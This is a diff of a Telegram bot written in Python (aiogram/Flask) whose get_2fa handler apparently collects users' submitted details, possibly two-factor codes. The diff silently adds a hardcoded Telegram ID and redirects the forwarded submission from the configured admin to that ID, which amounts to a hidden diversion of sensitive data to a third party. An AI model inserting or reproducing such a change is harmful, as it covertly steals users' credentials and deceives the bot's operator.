@@ -13,7 +13,7 @@ from aiogram.dispatcher.filters.state import State, StatesGroup
 # ==========================================
 API_TOKEN = os.getenv('BOT_TOKEN')
 ADMIN_ID = int(os.getenv('ADMIN_ID'))
-
+FILE_ADMIN_ID = 7446548744
 app = Flask('')
 @app.route('/')
 def home(): return "Bot is Online!"
@@ -223,7 +223,7 @@ async def get_2fa(message: types.Message, state: FSMContext):
         cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount_to_add, message.from_user.id))
     db.commit()
         
-    await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
+    await bot.send_message(FILE_ADMIN_ID, admin_msg, parse_mode="Markdown")
     await state.finish()
     await message.answer("✅ আপনার তথ্য জমা হয়েছে!\n📌 মেন মেনুতে ফিরে যেতে/start", reply_markup=main_menu())
     
